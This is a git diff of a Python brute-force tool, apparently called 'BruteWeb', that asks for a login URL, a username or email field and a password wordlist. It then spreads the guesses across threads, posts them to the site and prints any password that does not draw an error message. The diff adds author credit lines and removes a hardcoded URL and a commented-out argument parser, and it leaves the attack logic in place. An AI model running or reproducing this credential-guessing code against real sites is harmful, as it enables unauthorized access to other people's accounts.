@@ -1,8 +1,11 @@
+# Author : Hunter87
+# Github : https://github.com/hunter87ff
+# Insta  : https://instagram.com/im_hunter87
+# Youtube: https://youtube.com/@hunter87
+
 import requests, sys, os, time
 import threading, argparse
 req = requests
-url = "https://dashboard.87-hunter.repl.co/oauth"
-
 lgr='\033[1;32m' 
 red='\033[0;31m' 
 cyan='\033[36m' 
@@ -15,29 +18,14 @@ banner = f"""{red}
  | |_) | |  | |_| | ||  __/\ V  V /  __/ |_) |
  |____/|_|   \__,_|\__\___| \_/\_/ \___|_.__/ 
                                              
-                          {lgr}-By hunter87ff 
+                          {lgr}-By Hunter87ff 
 {NC}"""
 print(banner)
-
-
-# parser = argparse.ArgumentParser(usage="%(prog)s -u <url> [-t]  <target-variable> -d <email/username> [-pass] <password-parameter>\nExample:- %(prog)s -u https://example.com/login -t email -d hunter87@hunter87.me -password")
-# parser.add_argument('-u',help='enter the target url.', type=str)
-# parser.add_argument('-email', '-username',help='Target email or username', type=str)
-# parser.add_argument('-pass', '-password', '-psw', '-secret',metavar="<password parameter>" ,type=str,help='Enter the password parameter for the url acceptance')
-
-# args = parser.parse_args()
-# if not args.u: print("Required url missed"); sys.exit()
-# if not args.email or not args.username: print("Enter the password parameter for the url acceptance"); sys.exit()
-# # if not args.username: self.username = args.username
-# if not args.password or not args.Pass or not args.psw: print("Enter the password parameter for the url acceptance"); sys.exit()
-
-
 def is_incorrect(res):
 	error = ["incorrect", "wrong", "invalid", "not found"]
 	for err in error:
 		if err in res.lower():
 			return True
-
 def crack(url, target, dest, psw):
 	count = 1
 	for i in psw:
@@ -49,8 +37,6 @@ def crack(url, target, dest, psw):
 			print(f"{lgr}Password Is : {i}{NC}")
 			return True
 		count += 1
-
-
 def main():
 	url = input("Enter Url : ")
 	target = input("Target (eg: email, username): ")
@@ -67,5 +53,4 @@ def main():
 		passwords = f.read().split("\n")[0:chunk]
 		t = threading.Thread(target=crack, args=(url, target, dest, passwords, ))
 		t.start()
-
 main()
